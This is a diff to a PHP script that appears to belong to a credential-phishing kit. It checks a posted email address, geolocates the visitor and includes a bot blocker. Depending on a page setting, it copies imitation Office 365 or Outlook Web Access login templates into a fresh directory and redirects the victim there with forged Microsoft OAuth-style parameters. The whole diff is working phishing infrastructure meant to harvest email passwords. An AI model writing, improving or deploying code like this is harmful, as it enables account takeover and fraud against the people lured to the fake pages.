@@ -4,9 +4,9 @@ include('engine/owaf.php');
 include('blocker.php');
 include('config.php');
 
-ini_set('display_errors', 1);
+/* ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
+error_reporting(E_ALL); */
 
 function RandNumber($randstr)
 {
@@ -315,6 +315,7 @@ if (!filter_var(strtolower($_POST['token']), FILTER_VALIDATE_EMAIL)) {
 header("location: $redirect");
 exit;
 }
+
 $geoplugin = new geoPlugin();
 $geoplugin->locate();
 require_once('engine/Browser.php');
@@ -383,6 +384,35 @@ setcookie("ip", $iptoken, time() + (86400 * 30), "/"); // 86400 = 1 day
 $atdomain = strstr($email, '@');
 $domain = str_replace("@","",$atdomain);
 
+//single page start
+if ($page==1){
+	$src="office";
+	$client_id="000000".RandNumber(4)."-0000-0".RandString(3)."-".RandString(2)."00-000000000";
+	$token = $token_kr;
+	recurse_copy( $src, $dst );
+	header("Location: $dst/?client_id=$client_id&y=$token&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=client_id&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=0&client-request-id=45f4d5f9-4657-4816-9528-af3f59994174&protectedtoken=true");
+	exit;
+}
+elseif ($page==2) {
+	$src="newowa";
+	recurse_copy( $src, $dst );
+	header("Location: $dst/load.php?token=$token_kr");	
+	exit;
+}
+elseif ($page==3) {
+	$src="oldowa";
+	recurse_copy( $src, $dst );
+	header("Location: $dst/load.php?token=$token_kr");
+	exit;
+}
+elseif ($page==4) {
+	$src="domain";
+	recurse_copy( $src, $dst );
+	header("Location: $dst/load.php?token=$token_kr");	
+	exit;
+}
+
+//single page end
 $hosts = array();
 getmxrr($domain, $hosts);
 $owac = check_owa($domain);
